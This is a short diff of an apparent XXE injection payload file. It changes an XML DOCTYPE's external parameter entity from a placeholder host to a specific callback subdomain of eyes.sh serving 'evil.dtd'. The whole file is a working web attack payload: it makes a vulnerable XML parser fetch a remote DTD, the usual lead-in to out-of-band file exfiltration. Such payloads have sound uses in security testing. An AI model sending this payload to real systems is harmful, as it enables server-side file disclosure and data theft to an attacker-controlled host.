@@ -1,4 +1,4 @@
 <!DOCTYPE foo [<!ELEMENT foo ANY >
-<!ENTITY  % xxe SYSTEM "http://xxx.xxx.xxx/evil.dtd" >
+<!ENTITY  % xxe SYSTEM "http://xxx.xxx.xxx.3dwrn0o0.eyes.sh/evil.dtd" >
 %xxe;]>
 <foo>123</foo>
